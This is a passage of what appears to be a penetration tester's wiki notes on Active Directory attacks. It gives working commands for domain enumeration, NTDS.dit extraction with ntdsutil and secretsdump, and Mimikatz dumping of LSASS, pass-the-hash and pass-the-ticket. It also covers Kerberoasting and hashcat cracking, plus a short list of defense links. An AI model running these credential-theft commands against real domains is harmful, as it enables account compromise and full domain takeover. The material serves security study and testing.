<p><a href="https://github.com/winsaafman/Scriptdotsh-ActiveDirectory/raw/master/Microsoft.ActiveDirectory.Management.dll">https://github.com/winsaafman/Scriptdotsh-ActiveDirectory/raw/master/Microsoft.ActiveDirectory.Management.dll</a></p>
</blockquote>
<div class="codehilite"><pre><span></span><span class="nb">Import-Module</span> <span class="p">.\</span><span class="n">Microsoft</span><span class="p">.</span><span class="n">ActiveDirectory</span><span class="p">.</span><span class="n">Management</span><span class="p">.</span><span class="n">dll</span>
</pre></div>

<ul>
<li>Domain: <code class="codehilite"><span class="k">Get</span><span class="o">-</span><span class="n">ADDomain</span></code></li>
<li>Forest: <code class="codehilite"><span class="k">Get</span><span class="o">-</span><span class="n">ADForest</span></code></li>
<li>Trust: <code class="codehilite"><span class="k">Get</span><span class="o">-</span><span class="n">ADTrust</span> <span class="o">-</span><span class="n">Filter</span> <span class="o">*</span></code></li>
<li>Users: <code class="codehilite"><span class="k">Get</span><span class="o">-</span><span class="n">ADUser</span> <span class="o">-</span><span class="n">Filter</span> <span class="o">*</span></code></li>
<li>Groups : <code class="codehilite"><span class="k">Get</span><span class="o">-</span><span class="n">ADGroup</span> <span class="o">-</span><span class="n">Filter</span> <span class="o">*</span></code></li>
<li>Filter Groups for User: <code class="codehilite"><span class="k">Get</span><span class="o">-</span><span class="n">ADGroup</span> <span class="o">-</span><span class="n">Filter</span> <span class="err">{</span><span class="n">Name</span> <span class="o">-</span><span class="k">like</span> <span class="ss">&quot;*admin*&quot;</span><span class="err">}</span> <span class="o">|</span> <span class="k">select</span> <span class="n">name</span><span class="p">,</span> <span class="n">GroupScope</span></code></li>
</ul>
<h3 id="powerview">PowerView<a class="headerlink" href="#powerview" title="Permanent link">&para;</a></h3>
<div class="codehilite"><pre><span></span><span class="p">.</span><span class="o">/</span><span class="n">PowerView</span><span class="p">.</span><span class="n">ps1</span>
</pre></div>

<ul>
<li>All domain computers: <code class="codehilite"><span class="k">Get</span><span class="o">-</span><span class="n">NetComputer</span></code></li>
<li>Domain Controller: <code class="codehilite"><span class="k">Get</span><span class="o">-</span><span class="n">NetDomainController</span></code></li>
<li>Groups: <code class="codehilite"><span class="k">Get</span><span class="o">-</span><span class="n">NetGroup</span></code></li>
<li>Sessions: <code class="codehilite"><span class="k">Get</span><span class="o">-</span><span class="n">NetSession</span></code></li>
<li>ACL for AD objects: <code class="codehilite"><span class="k">Get</span><span class="o">-</span><span class="n">ObjectAcl</span></code></li>
<li>Check if current user context has local-admin access to hosts in the domain: <code class="codehilite"><span class="n">Find</span><span class="o">-</span><span class="n">LocalAdminAccess</span> <span class="o">-</span><span class="k">Verbose</span></code></li>
<li>Enumerate members of local-admin groups across all machines: <code class="codehilite"><span class="n">Invoke</span><span class="o">-</span><span class="n">EnumerateLocalAdmin</span> <span class="o">-</span><span class="k">Verbose</span></code></li>
</ul>
<h3 id="snapshot-for-offline-analysis">Snapshot for Offline Analysis<a class="headerlink" href="#snapshot-for-offline-analysis" title="Permanent link">&para;</a></h3>
<p>Using <a href="https://docs.microsoft.com/en-us/sysinternals/downloads/adexplorer">https://docs.microsoft.com/en-us/sysinternals/downloads/adexplorer</a></p>
<p>Download: <a href="https://live.sysinternals.com/">https://live.sysinternals.com/</a></p>
<p>UNC path: <code class="codehilite"><span class="err">\\</span><span class="n">live</span><span class="p">.</span><span class="n">sysinternals</span><span class="p">.</span><span class="n">com</span><span class="err">\</span><span class="n">tools</span></code></p>
<h3 id="bloodhound"><a href="https://github.com/BloodHoundAD/BloodHound">Bloodhound</a><a class="headerlink" href="#bloodhound" title="Permanent link">&para;</a></h3>
<ul>
<li>Finds groups and group members of each group.</li>
<li>Gets Domain computers in the domain.</li>
<li>Obtain local admins for each computer.</li>
<li>List Active sessions on each computer.</li>
<li>And then creates relationships between all these findings.</li>
</ul>
<h2 id="sysvol">SYSVOL<a class="headerlink" href="#sysvol" title="Permanent link">&para;</a></h2>
<blockquote>
<p>Ref: <a href="https://social.technet.microsoft.com/wiki/contents/articles/24160.active-directory-back-to-basics-sysvol.aspx">https://social.technet.microsoft.com/wiki/contents/articles/24160.active-directory-back-to-basics-sysvol.aspx</a></p>
</blockquote>
<ul>
<li>Folder which resides on each and every <a href="http://social.technet.microsoft.com/wiki/contents/articles/16757.active-directory-glossary.aspx#Domain_Controller">domain controller</a> within the <a href="http://social.technet.microsoft.com/wiki/contents/articles/16757.active-directory-glossary.aspx#Domain">domain</a>.</li>
<li>Contains the domains public files that need to be accessed by clients and kept synchronised between domain controllers.</li>
<li>Default location is <code class="codehilite"><span class="k">C</span><span class="p">:</span><span class="err">\</span><span class="n">Windows</span><span class="err">\</span><span class="n">SYSVOL</span></code></li>
<li>The SYSVOL folder can be accessed through:<ul>
<li>share <code class="codehilite"><span class="err">\\</span><span class="n">domainname</span><span class="p">.</span><span class="n">com</span><span class="err">\</span><span class="n">sysvol</span></code></li>
<li>or the local share name on the server <code class="codehilite"><span class="err">\\</span><span class="n">servername</span><span class="err">\</span><span class="n">sysvol</span></code>.</li>
</ul>
</li>
<li>Uses <a href="http://social.technet.microsoft.com/wiki/contents/articles/16757.active-directory-glossary.aspx#DFS">DFS</a> to share the relevant folders to users and clients. - Distributed File System. Client and server services that allow servers to organize distributed file shares into a distributed file system.</li>
<li><a href="http://social.technet.microsoft.com/wiki/contents/articles/16757.active-directory-glossary.aspx#FRS">File Replication Service - FRS</a> is a multi-master, multi-threaded replication technology.<ul>
<li>Introduced in Windows 2000 to replace the previous LMREPL technology used in NT3.x and 4 days</li>
<li>Ageing Cache - Detects the change by monitoring the NTFS USN journal (stored in NTFRS database) (every 3 seconds)</li>
<li>Replaced by DFSR (Distributed File System Replication) in Windows 2008 or higher<ul>
<li>Auto-healing functions in place to remedy some of the issues that FRS</li>
<li>Instead of replicating entire files we only replicate the chunks of data that have changed</li>
<li>Based on <a href="http://social.technet.microsoft.com/wiki/contents/articles/20580.wiki-glossary-of-technology-acronyms.aspx#MD4">MD4</a> hash of the file</li>
</ul>
</li>
</ul>
</li>
</ul>
<blockquote>
<p>The log contains information about the file and the time it was changed, this is then used to build its change message. To ensure the file and all it’s attributes (i.e. permissions) are kept intact FRS calls the backup <a href="http://social.technet.microsoft.com/wiki/contents/articles/20580.wiki-glossary-of-technology-acronyms.aspx#API">API</a>which uses <a href="http://social.technet.microsoft.com/wiki/contents/articles/20580.wiki-glossary-of-technology-acronyms.aspx#VSS">VSS</a> technology to take a snapshot of the file and it’s attributes. This backup file is then compressed and stored in the staging area folder. At this point the outbound log is updated (again this is actually a table within the FRS database). This contains information about all the changes for a specified replication set. If in step 1 a file was deleted rather than created then we don’t create a staging file, but the outbound log reflects the deletion. FRS on DC1 then sends a change notification to its replication partner DC2. DC2 adds the information about the change into its inbound log and accepts the change then sends a change acknowledgment back to DC1. DC2 then copies the file from DC1 into its staging area. It then writes an entry to its outbound log to allow other partners to pickup the change. DC2 then calls the backup API to restore the file from the staging area into the SYSVOL folder. So there you have it, FRS replication. There is a very detailed and in-depth reference guide on TechNet<a href="http://technet.microsoft.com/en-us/library/cc758169(v=WS.10).aspx">here</a> for further reference.</p>
</blockquote>
<h2 id="collections">Collections<a class="headerlink" href="#collections" title="Permanent link">&para;</a></h2>
<ul>
<li><a href="https://github.com/infosecn1nja/AD-Attack-Defense">Active Directory Kill Chain Attack &amp; Defense</a></li>
</ul>
<h2 id="attack-patterns">Attack Patterns<a class="headerlink" href="#attack-patterns" title="Permanent link">&para;</a></h2>
<p><img alt="image-20190603080125614" src="../_assets/image-20190603080125614.png" /></p>
<blockquote>
<p>Ref: <a href="https://www.blackhat.com/docs/us-14/materials/us-14-Duckwall-Abusing-Microsoft-Kerberos-Sorry-You-Guys-Don't-Get-It.pdf">https://www.blackhat.com/docs/us-14/materials/us-14-Duckwall-Abusing-Microsoft-Kerberos-Sorry-You-Guys-Don't-Get-It.pdf</a></p>
</blockquote>
<h3 id="dumping-ad-credentials">Dumping AD Credentials<a class="headerlink" href="#dumping-ad-credentials" title="Permanent link">&para;</a></h3>
<h4 id="secretsdump">secretsdump<a class="headerlink" href="#secretsdump" title="Permanent link">&para;</a></h4>
<p>Need domain admin credentials:
<div class="codehilite"><pre><span></span><span class="n">secretsdump</span><span class="p">.</span><span class="n">py</span> <span class="o">-</span><span class="n">just</span><span class="o">-</span><span class="n">dc</span><span class="o">-</span><span class="n">ntlm</span> <span class="o">&lt;</span><span class="k">DOMAIN</span><span class="o">&gt;/&lt;</span><span class="k">USER</span><span class="o">&gt;@&lt;</span><span class="n">DOMAIN_CONTROLLER</span><span class="o">&gt;</span>
</pre></div></p>
<h4 id="ntdsdit">NTDS.dit<a class="headerlink" href="#ntdsdit" title="Permanent link">&para;</a></h4>
<ul>
<li>AD data stored in: <code class="codehilite"><span class="c">%SYSTEMROOT%\NTDS\ntds.dit</span></code><ul>
<li>Cannot be copied directly to another location</li>
<li>Can be extracted using<ul>
<li>Domain Controller Replication Services</li>
<li>Native Windows Binaries</li>
<li>WMI</li>
<li>Backups / External Storage for DC</li>
<li>VMWare / HyperV for virtual DCs<ul>
<li>VMWare admin can call virtual DC within VMWare</li>
<li>Clone a DC and copy the storage file</li>
<li>No events triggered</li>
</ul>
</li>
<li>NTDSUtil<ul>
<li>DC Promo has to copy from another DC</li>
<li>But if NTDSUtil was used to create an IMF (Install From Media), it makes a copy of NTDS.dit<ul>
<li>Can use NTDSUtil to create an IMF or look for IMF in network</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
<li>Extraction techniques and tools: <a href="https://pentestlab.blog/2018/07/04/dumping-domain-password-hashes/">https://pentestlab.blog/2018/07/04/dumping-domain-password-hashes/ - Dumping Domain Password Hashes</a></li>
</ul>
<p>Steps:</p>
<ul>
<li>cmd.exe as Administrator</li>
<li>ntdsutil
<div class="codehilite"><pre><span></span><span class="n">snapshot</span>
<span class="n">activate</span> <span class="n">instance</span> <span class="n">NTDS</span>
<span class="k">create</span>

<span class="n">mount</span> <span class="o">&lt;</span><span class="n">UUID</span><span class="o">&gt;</span>
</pre></div></li>
<li>copy NTDS.dit (located in Windows\NTDS\NTDS.dit by default)</li>
<li>ntdsutil
<div class="codehilite"><pre><span></span><span class="n">unmount</span> <span class="o">&lt;</span><span class="n">UUID</span><span class="o">&gt;</span>
<span class="k">delete</span> <span class="o">&lt;</span><span class="n">UUID</span><span class="o">&gt;</span>
<span class="n">quit</span>
<span class="n">quit</span>
</pre></div>
<div class="codehilite"><pre><span></span><span class="n">reg</span><span class="p">.</span><span class="n">exe</span> <span class="n">save</span> <span class="n">HKLM</span><span class="err">\</span><span class="k">SYSTEM</span> <span class="o">&lt;</span><span class="n">path_where_you_want_to_save_it</span><span class="o">&gt;</span>
</pre></div>
<div class="codehilite"><pre><span></span><span class="n">secretsdump</span><span class="p">.</span><span class="n">py</span> <span class="o">-</span><span class="k">system</span> <span class="o">&lt;</span><span class="n">path_to_system_hive</span><span class="o">&gt;</span> <span class="o">-</span><span class="n">ntds</span> <span class="o">&lt;</span><span class="n">path_to_ntds</span><span class="p">.</span><span class="n">dit</span><span class="o">&gt;</span> <span class="k">LOCAL</span>
</pre></div></li>
</ul>
<h4 id="dumping-credentials-on-dc">Dumping Credentials on DC<a class="headerlink" href="#dumping-credentials-on-dc" title="Permanent link">&para;</a></h4>
<ul>
<li>Take memory dump of LSASS process using task manager and use Mimikatz offline</li>
<li>Run Mimikatz on DC</li>
<li>Invoke-Mimikatz on DC via PS remoting</li>
</ul>
<h3 id="pass-the-hash">Pass the Hash<a class="headerlink" href="#pass-the-hash" title="Permanent link">&para;</a></h3>
<p><img alt="image-20190603075202692" src="../_assets/image-20190603075202692.png" /></p>
<blockquote>
<p>Ref: <a href="https://www.blackhat.com/docs/us-14/materials/us-14-Duckwall-Abusing-Microsoft-Kerberos-Sorry-You-Guys-Don't-Get-It.pdf">https://www.blackhat.com/docs/us-14/materials/us-14-Duckwall-Abusing-Microsoft-Kerberos-Sorry-You-Guys-Don't-Get-It.pdf</a></p>
</blockquote>
<ul>
<li>In typical scenario:<ul>
<li>User type the password</li>
<li>LSASS hash the password (LM, NTLM) and send it to service for authentication</li>
</ul>
</li>
<li>In attack scenario:<ul>
<li>Attacker pass the hash (LM, NTML) itself to LSASS which is sent to service</li>
</ul>
</li>
<li>Preventions<ul>
<li>Disable NTML hashes</li>
<li>"Protected Users" group</li>
<li>Do not leave lot of NTLM authentication footprint in eventless</li>
</ul>
</li>
</ul>
<h3 id="over-pass-the-hash-pass-the-key">Over Pass the Hash / Pass the Key<a class="headerlink" href="#over-pass-the-hash-pass-the-key" title="Permanent link">&para;</a></h3>
<p><img alt="image-20190603075915450" src="../_assets/image-20190603075915450.png" />&gt; Ref: <a href="https://www.blackhat.com/docs/us-14/materials/us-14-Duckwall-Abusing-Microsoft-Kerberos-Sorry-You-Guys-Don't-Get-It.pdf">https://www.blackhat.com/docs/us-14/materials/us-14-Duckwall-Abusing-Microsoft-Kerberos-Sorry-You-Guys-Don't-Get-It.pdf</a></p>
<ul>
<li>If NTLM hash is available, encrypt timestamp with hash and sent it to <strong>KDC</strong> in <strong>AS-REQ</strong> to get a <strong>TGT</strong></li>
<li>Keys are in:<ul>
<li>Client LSASS memory<ul>
<li>Prevented by "Protected Users" group</li>
</ul>
</li>
<li>Active Directory<ul>
<li>NTDS.dit and SYSTEM hive</li>
<li>Offline<ul>
<li>[Tool] NTDSXtract</li>
<li><code class="codehilite"><span class="n">python</span> <span class="n">DSUser</span><span class="p">.</span><span class="n">py</span> <span class="n">ntds</span><span class="p">.</span><span class="n">dit</span><span class="p">.</span><span class="n">export</span><span class="o">/</span><span class="n">datatable</span><span class="p">.</span><span class="mi">4</span> <span class="n">ntds</span><span class="p">.</span><span class="n">dit</span><span class="p">.</span><span class="n">export</span><span class="o">/</span><span class="n">link_table</span><span class="p">.</span><span class="mi">7</span> <span class="p">.</span><span class="o">/</span><span class="k">work</span> <span class="o">-</span><span class="n">name</span> <span class="n">Administrator</span> <span class="c1">--syshive SYSTEM --supplcreds --passwordhashes --lmoutfile ./lm --ntoutfile ./nt --pwdformat john</span></code></li>
<li><code class="codehilite"><span class="n">privilege</span><span class="p">::</span><span class="n">debug</span>    <span class="n">sekurlsa</span><span class="p">::</span><span class="n">ekeys</span></code></li>
</ul>
</li>
<li>Online<ul>
<li><code class="codehilite"><span class="n">privilege</span><span class="p">::</span><span class="n">debug</span>    <span class="n">lsadump</span><span class="p">::</span><span class="n">lsa</span> <span class="o">/</span><span class="n">inject</span> <span class="o">/</span><span class="n">name</span><span class="p">:</span><span class="n">Administrator</span></code></li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
<li>Keys are in:<ul>
<li>DES</li>
<li>RC4 - Non domain salted NTML hash</li>
<li>AES128 AES256 keys (NT6+)<ul>
<li>Use PBKDF2</li>
<li>Salted</li>
<li>4096 iterations</li>
<li>Cracking is difficult</li>
</ul>
</li>
</ul>
</li>
<li>Over pass the hash<ul>
<li><code class="codehilite"><span class="n">privilege</span><span class="p">::</span><span class="n">debug</span>    <span class="n">sekurlsa</span><span class="p">::</span><span class="n">pth</span> <span class="o">/</span><span class="k">user</span><span class="p">:</span><span class="n">Administrator</span> <span class="o">/</span><span class="k">domain</span><span class="p">:</span><span class="o">&lt;</span><span class="n">DomainName</span><span class="o">&gt;</span> <span class="o">/</span><span class="n">ntlm</span><span class="p">:</span><span class="o">&lt;</span><span class="n">Hash</span><span class="o">&gt;</span></code></li>
</ul>
</li>
<li>References<ul>
<li><a href="http://www.janua.fr/active-directory-vulnerability-disclosure-weak-encryption-enables-attacker-to-change-victims-password-without-being-logged/">http://www.janua.fr/active-directory-vulnerability-disclosure-weak-encryption-enables-attacker-to-change-victims-password-without-being-logged/</a></li>
</ul>
</li>
</ul>
<h3 id="pass-the-ticket">Pass the Ticket<a class="headerlink" href="#pass-the-ticket" title="Permanent link">&para;</a></h3>
<p><img alt="image-20190603080021618" src="../_assets/image-20190603080021618.png" /></p>
<p><img alt="image-20190603080049817" src="../_assets/image-20190603080049817.png" /></p>
<blockquote>
<p>Ref: <a href="https://www.blackhat.com/docs/us-14/materials/us-14-Duckwall-Abusing-Microsoft-Kerberos-Sorry-You-Guys-Don't-Get-It.pdf">https://www.blackhat.com/docs/us-14/materials/us-14-Duckwall-Abusing-Microsoft-Kerberos-Sorry-You-Guys-Don't-Get-It.pdf</a></p>
</blockquote>
<ul>
<li><strong>Inject the TGT</strong> in to the LSASS Kerberos Provider<ul>
<li>Do not ask the KDC for the TGT, instead ask the KDC to give us a TGS</li>
</ul>
</li>
<li>Can also <strong>inject TGS</strong> in to the LSASS Kerberos Provider</li>
<li>Exporting from memory:<ul>
<li>API only allow exporting current user's tickets (your tickets)</li>
<li>TGT: AllowTgtSessionKey reg-key must be set</li>
<li>TGS: No restrictions</li>
</ul>
</li>
<li><a href="http://msdn.microsoft.com/library/windows/desktop/aa378099.aspx">http://msdn.microsoft.com/library/windows/desktop/aa378099.aspx</a></li>
</ul>
<div class="codehilite"><pre><span></span><span class="n">LsaCallAuthenticationPackage</span><span class="o">/</span><span class="n">KerbRetrieveEncodedTicketMessage</span>
<span class="n">LsaCallAuthenticationPackage</span><span class="o">/</span><span class="n">KerbSubmitTicketMessage</span>
</pre></div>

<div class="codehilite"><pre><span></span><span class="n">mimikatz</span> <span class="o">&gt;</span> <span class="n">kerberos</span><span class="p">::</span><span class="n">list</span> <span class="p">[</span><span class="o">/</span><span class="n">export</span><span class="p">]</span>
<span class="n">mimikatz</span> <span class="o">&gt;</span> <span class="n">kerberos</span><span class="p">::</span><span class="n">ptt</span> <span class="n">ticket</span>
</pre></div>

<ul>
<li>For all users in LSASS memory:</li>
</ul>
<div class="codehilite"><pre><span></span><span class="n">privilege</span><span class="p">::</span><span class="n">debug</span>
<span class="n">sekurlsa</span><span class="p">::</span><span class="n">tickets</span> <span class="n">export</span>
<span class="n">kerberos</span><span class="p">:</span><span class="n">ptt</span> <span class="o">&lt;</span><span class="n">ticket</span><span class="p">.</span><span class="n">kirbi</span><span class="o">&gt;</span>
</pre></div>

<h3 id="dcsyc">DCSyc<a class="headerlink" href="#dcsyc" title="Permanent link">&para;</a></h3>
<ul>
<li>Used to sync AD to Azure</li>
<li>Can be used to get credentials from AD<ul>
<li>If <code class="codehilite"><span class="n">reverse</span> <span class="n">encryption</span></code> is enabled for an account, clear text password can be obtained.</li>
</ul>
</li>
<li>Needs Administrator or Domain Controller rights</li>
<li>By default, no logs since this is done through official RPC (remotely)</li>
<li>Implemented by: Mimikatz (lsadump:dcsync), Impacket, DSInternals</li>
</ul>
<p><img alt="image-20190611062259293" src="../_assets/image-20190611062259293.png" /></p>
<ul>
<li>DCSync is easy to detected</li>
</ul>
<h3 id="nrpc-netlogon">NRPC (NetLogon)<a class="headerlink" href="#nrpc-netlogon" title="Permanent link">&para;</a></h3>
<ul>
<li>When you have domain admin account for one DC, can as another DC to send all NTLM hashed of computer accounts and domain controller accounts.</li>
<li>Can be used to create silver tickets.   </li>
<li>If you have rights flip some bytes of the account, can make a normal user account a workstation account. Can be used to get user accounts using this.</li>
</ul>
<h3 id="references">References<a class="headerlink" href="#references" title="Permanent link">&para;</a></h3>
<ul>
<li>Wagging the Dog: Abusing Resource-Based Constrained Delegation to Attack Active Directory: <a href="https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html">https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html</a></li>
<li>Escalating privileges with ACLs in Active Directory: <a href="https://blog.fox-it.com/2018/04/26/escalating-privileges-with-acls-in-active-directory/">https://blog.fox-it.com/2018/04/26/escalating-privileges-with-acls-in-active-directory/</a></li>
</ul>
<ul>
<li><a href="https://blog.stealthbits.com/discovering-service-accounts-without-using-privileges">https://blog.stealthbits.com/discovering-service-accounts-without-using-privileges</a></li>
<li><a href="https://blog.stealthbits.com/extracting-service-account-passwords-with-kerberoasting">https://blog.stealthbits.com/extracting-service-account-passwords-with-kerberoasting</a></li>
<li><a href="https://blog.stealthbits.com/impersonating-service-accounts-with-silver-tickets">https://blog.stealthbits.com/impersonating-service-accounts-with-silver-tickets</a></li>
<li><a href="https://blog.stealthbits.com/complete-domain-compromise-with-golden-tickets/">https://blog.stealthbits.com/complete-domain-compromise-with-golden-tickets/</a></li>
<li><a href="https://medium.com/@t0pazg3m/pass-the-ticket-ptt-attack-in-mimikatz-and-a-gotcha-96a5805e257a">https://medium.com/@t0pazg3m/pass-the-ticket-ptt-attack-in-mimikatz-and-a-gotcha-96a5805e257a</a></li>
</ul>
<ul>
<li><a href="https://blog.stealthbits.com/performing-domain-reconnaissance-using-powershell">https://blog.stealthbits.com/performing-domain-reconnaissance-using-powershell</a></li>
<li><a href="https://blog.stealthbits.com/local-admin-mapping-bloodhound">https://blog.stealthbits.com/local-admin-mapping-bloodhound</a></li>
<li><a href="https://blog.stealthbits.com/extracting-password-hashes-from-the-ntds-dit-file/">https://blog.stealthbits.com/extracting-password-hashes-from-the-ntds-dit-file/</a></li>
<li><a href="https://blog.stealthbits.com/passing-the-hash-with-mimikatz">https://blog.stealthbits.com/passing-the-hash-with-mimikatz</a></li>
<li><a href="https://blog.stealthbits.com/what-is-dcsync-an-introduction/">https://blog.stealthbits.com/what-is-dcsync-an-introduction/</a></li>
</ul>
<ul>
<li><a href="https://hausec.com/2019/03/05/penetration-testing-active-directory-part-i/">https://hausec.com/2019/03/05/penetration-testing-active-directory-part-i/</a></li>
<li><a href="https://hausec.com/2019/03/12/penetration-testing-active-directory-part-ii/">https://hausec.com/2019/03/12/penetration-testing-active-directory-part-ii/</a></li>
</ul>
<ul>
<li><a href="https://blog.ropnop.com/practical-usage-of-ntlm-hashes/">https://blog.ropnop.com/practical-usage-of-ntlm-hashes/</a></li>
<li><a href="https://blog.ropnop.com/extracting-hashes-and-domain-info-from-ntds-dit/">https://blog.ropnop.com/extracting-hashes-and-domain-info-from-ntds-dit/</a></li>
<li><a href="https://blog.ropnop.com/using-credentials-to-own-windows-boxes/">https://blog.ropnop.com/using-credentials-to-own-windows-boxes/</a></li>
<li><a href="https://blog.ropnop.com/using-credentials-to-own-windows-boxes-part-2-psexec-and-services/">https://blog.ropnop.com/using-credentials-to-own-windows-boxes-part-2-psexec-and-services/</a></li>
</ul>
<ul>
<li><a href="https://0xdarkvortex.dev/index.php/2019/01/01/active-directory-penetration-dojo-ad-environment-enumeration-1/">https://0xdarkvortex.dev/index.php/2019/01/01/active-directory-penetration-dojo-ad-environment-enumeration-1/</a></li>
<li><a href="https://0xdarkvortex.dev/index.php/2018/08/26/active-directory-penetration-dojo-setup-of-ad-penetration-labpart-2/">https://0xdarkvortex.dev/index.php/2018/08/26/active-directory-penetration-dojo-setup-of-ad-penetration-labpart-2/</a></li>
<li><a href="https://0xdarkvortex.dev/index.php/2018/10/29/active-directory-penetration-dojo-creation-of-forest-trustpart-3/">https://0xdarkvortex.dev/index.php/2018/10/29/active-directory-penetration-dojo-creation-of-forest-trustpart-3/</a></li>
</ul>
<ul>
<li><a href="https://www.attackdebris.com/?p=470">https://www.attackdebris.com/?p=470</a></li>
<li><a href="https://blog.didierstevens.com/2016/08/12/mimikatz-golden-ticket-dcsync/">https://blog.didierstevens.com/2016/08/12/mimikatz-golden-ticket-dcsync/</a></li>
</ul>
<ul>
<li><a href="https://adsecurity.org/?p=2362">https://adsecurity.org/?p=2362</a></li>
</ul>
<ul>
<li><a href="https://pentestlab.blog/tag/ntds-dit/">https://pentestlab.blog/tag/ntds-dit/</a></li>
</ul>
<ul>
<li><a href="http://www.harmj0y.net/blog/penetesting/pass-the-hash-is-dead-long-live-pass-the-hash/">http://www.harmj0y.net/blog/penetesting/pass-the-hash-is-dead-long-live-pass-the-hash/</a></li>
<li><a href="http://passing-the-hash.blogspot.com/">http://passing-the-hash.blogspot.com/</a></li>
</ul>
<p><a href="http://blog.liatsisfotis.com/knock-and-pass-kerberos-exploitation.html">http://blog.liatsisfotis.com/knock-and-pass-kerberos-exploitation.html</a> 
<a href="https://room362.com/post/2017/reset-ad-user-password-with-linux/">https://room362.com/post/2017/reset-ad-user-password-with-linux/</a></p>
<p><a href="https://posts.specterops.io/attacking-azure-azure-ad-and-introducing-powerzure-ca70b330511a">https://posts.specterops.io/attacking-azure-azure-ad-and-introducing-powerzure-ca70b330511a</a></p>
<p><a href="https://posts.specterops.io/attacking-azure-azure-ad-and-introducing-powerzure-ca70b330511a">https://posts.specterops.io/attacking-azure-azure-ad-and-introducing-powerzure-ca70b330511a</a>
  TR19: I'm in your cloud, reading everyone's emails - hacking Azure AD via Active Directory: <a href="https://www.youtube.com/watch?v=JEIR5oGCwdg">https://www.youtube.com/watch?v=JEIR5oGCwdg</a>
  Azure AD Connect for Red Teamers: <a href="https://blog.xpnsec.com/azuread-connect-for-redteam/">https://blog.xpnsec.com/azuread-connect-for-redteam/</a>
  <a href="https://github.com/hausec/PowerZure">https://github.com/hausec/PowerZure</a></p>
<ul>
<li>How Attackers Pull the Active Directory Database (NTDS.dit) from a Domain Controller: <a href="https://adsecurity.org/?p=451">https://adsecurity.org/?p=451</a></li>
<li>Attack Methods for Gaining Domain Admin Rights in Active Directory: <a href="https://adsecurity.org/?p=2362">https://adsecurity.org/?p=2362</a></li>
<li>Mimikatz DCSync Usage, Exploitation, and Detection: <a href="https://adsecurity.org/?p=1729">https://adsecurity.org/?p=1729</a></li>
<li>How Attackers Dump Active Directory Database Credentials: <a href="https://adsecurity.org/?p=2398">https://adsecurity.org/?p=2398</a></li>
</ul>
<h2 id="defense">Defense<a class="headerlink" href="#defense" title="Permanent link">&para;</a></h2>
<ul>
<li>Active Directory Core Security Principles &amp; Best Practices:  <a href="https://ernw.de/download/AD_Summit_2018/01_AD_Summit_CoreSecPrinciples_fk_hw_v.1.2_signed.pdf">https://ernw.de/download/AD_Summit_2018/01_AD_Summit_CoreSecPrinciples_fk_hw_v.1.2_signed.pdf</a></li>
<li>Active Directory Kill Chain Attack &amp; Defense: <a href="https://github.com/infosecn1nja/AD-Attack-Defense">https://github.com/infosecn1nja/AD-Attack-Defense</a></li>
<li>Microsoft-Blue-Forest: <a href="https://github.com/rootsecdev/Microsoft-Blue-Forest">https://github.com/rootsecdev/Microsoft-Blue-Forest</a><ul>
<li>Welcome to building your first domain controller!: <a href="https://github.com/rootsecdev/Microsoft-Blue-Forest/blob/master/FirstDomainControllerInstall.md">https://github.com/rootsecdev/Microsoft-Blue-Forest/blob/master/FirstDomainControllerInstall.md</a></li>
</ul>
</li>
<li>Pwn and Defend - Active Directory Domain Enumeration: <a href="https://www.youtube.com/watch?v=YxeXfHkHAUI&amp;feature=youtu.be">https://www.youtube.com/watch?v=YxeXfHkHAUI&amp;feature=youtu.be</a></li>
</ul>
<h2 id="kb2871997">KB2871997<a class="headerlink" href="#kb2871997" title="Permanent link">&para;</a></h2>
<ul>
<li><a href="https://technet.microsoft.com/library/security/2871997">https://technet.microsoft.com/library/security/2871997</a></li>
<li>Microsoft has definitely raised the bar: accounts that are members of the localgroup “Administrators” are no longer able to execute code with WMI or PSEXEC, use schtasks or at, or even browse the open shares on the target machine. Oh, except (as pwnag3 reports and our experiences confirm) the RID 500 built-in Administrator account, even if it’s renamed.</li>
</ul>
<h2 id="microsoft-windows-ad-kerberos-tickets">Microsoft Windows AD Kerberos Tickets<a class="headerlink" href="#microsoft-windows-ad-kerberos-tickets" title="Permanent link">&para;</a></h2>
<p>Gather tickets 
<div class="codehilite"><pre><span></span><span class="n">GetUserSPNs</span><span class="p">.</span><span class="n">py</span> <span class="o">-</span><span class="n">request</span> <span class="p">(</span><span class="k">HOST</span><span class="p">.</span><span class="k">DOMAIN</span><span class="p">)</span><span class="o">/</span><span class="p">(</span><span class="k">VALID</span> <span class="n">SMB</span> <span class="k">USER</span><span class="p">):(</span><span class="k">USER</span> <span class="n">PASSWORD</span><span class="p">)</span>
</pre></div></p>
<p>Crack
<div class="codehilite"><pre><span></span><span class="o">-</span><span class="nv">a</span> <span class="mi">0</span> <span class="o">-</span> <span class="nv">Straight</span> <span class="nv">cracking</span> <span class="nv">mode</span>
<span class="o">-</span><span class="nv">m</span> <span class="mi">13100</span> <span class="o">-</span> <span class="nv">Hashtype</span> <span class="mi">13100</span> <span class="o">-</span> <span class="nv">which</span> <span class="nv">is</span> <span class="nv">Kerberos</span> <span class="mi">5</span> <span class="nv">TGS</span><span class="o">-</span><span class="nv">REP</span> <span class="nv">etype</span> <span class="mi">23</span>
<span class="nv">the</span> <span class="nv">kerberos</span>.<span class="nv">ticket</span> <span class="nv">file</span>
<span class="o">-</span><span class="nv">w</span> <span class="mi">3</span> <span class="o">-</span> <span class="nv">Suggested</span> <span class="nv">example</span> <span class="s2">&quot;</span><span class="s">workload</span><span class="s2">&quot;</span> <span class="nv">setting</span> <span class="k">for</span> <span class="nv">Hashcat</span>

.\<span class="nv">hashcat64</span>.<span class="nv">exe</span> <span class="o">-</span><span class="nv">m</span> <span class="mi">13100</span> <span class="o">-</span><span class="nv">a</span> <span class="mi">0</span> <span class="s1">&#39;</span><span class="s">C:\Users\weaknet\Desktop\Portfolio\VMWare Shared\kerberos.tick</span>
<span class="nv">et</span><span class="s1">&#39;</span><span class="s"> -w 3 </span><span class="s1">&#39;</span><span class="nv">C</span>:\<span class="nv">Users</span>\<span class="nv">weaknet</span>\<span class="nv">Desktop</span>\<span class="nv">Portfolio</span>\<span class="nv">VMWare</span> <span class="nv">Shared</span>\<span class="nv">rockyou</span>.<span class="nv">txt</span><span class="s1">&#39;</span>
<span class="nv">hashcat</span> <span class="ss">(</span><span class="nv">v5</span>.<span class="mi">1</span>.<span class="mi">0</span><span class="ss">)</span> <span class="nv">starting</span>...
</pre></div></p>
